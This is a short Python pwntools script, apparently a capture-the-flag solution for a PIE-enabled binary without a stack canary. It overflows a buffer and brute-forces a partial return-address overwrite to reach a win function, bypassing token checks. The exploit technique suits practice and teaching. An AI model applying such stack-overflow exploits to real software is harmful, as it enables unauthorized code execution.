from pwn import *

'''
[*] '/challenge/binary-exploitation-pie-overflow'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''
i = 0
#0000000000002140 <main>:
for i in "0123456789abcdef":
    r = process('/challenge/binary-exploitation-pie-overflow')
    print(r.recvline())
    save_addr = 0x21c6
    main_offset = 0x2140
    win_offset = 0x1f37
    offset = 0x60 + 8
    payload = offset * b'A' + b'\x53' + bytes.fromhex(f"{i}f")# skiiping the token checks
    print(r.recvline_contains('Send', timeout=0.5).decode())
    r.send(payload )
    try:
        line = r.recvline().decode()
        line += r.recvline().decode()
        line += r.recvline().decode()
    except:
        line = 'no line'
    
    print('i  ' + str(i) + '   ' + line )
    # main + 0x86

